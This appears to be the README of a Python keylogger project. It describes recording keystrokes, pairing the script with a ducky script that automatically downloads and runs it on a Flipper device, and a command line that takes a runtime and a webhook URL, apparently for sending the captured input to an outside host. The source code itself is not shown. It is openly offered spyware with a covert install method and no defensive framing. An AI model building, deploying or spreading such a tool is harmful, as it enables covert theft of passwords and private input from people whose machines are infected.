# Python Keylogger

Pretty basic script to listen to keyboard input, formatting strings, separating spaces + other special characters. Added together with a ducky script that will automatically download and run on Flipper. Just remember to change the settings.
You can also just run the script via command lind arguements. 

```bash
python PyKL.py <runtime> <webhook_url>
```
